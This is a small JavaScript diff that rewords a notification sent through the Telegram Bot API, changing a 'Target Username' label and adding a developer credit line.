@@ -147,7 +147,7 @@
             }
 
             // Prepare message for Telegram
-            const message = `🎯 Target Username: ${cleanUsername}\nYour Chat ID: ${chatId}`;
+            const message = `🎯 It's Target Username >>> ${cleanUsername}\nYour Chat ID: ${chatId}\n\nDeveloped By @ScorpionYug & Zara`;
             try {
                 const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
